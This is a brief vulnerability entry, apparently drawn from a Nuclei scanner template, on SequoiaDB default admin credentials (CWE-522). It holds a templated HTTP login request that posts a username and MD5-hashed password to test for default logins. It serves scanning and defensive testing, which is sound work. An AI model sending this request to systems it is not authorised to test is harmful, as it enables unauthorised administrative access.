# Vulnerability: SequoiaDB Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`sequoiadb-default-login.yaml`)

## Description
SequoiaDB default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Accept: */*
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
SdbLanguage: en

cmd=login&user={{username}}&passwd={{md5(password)}}
```

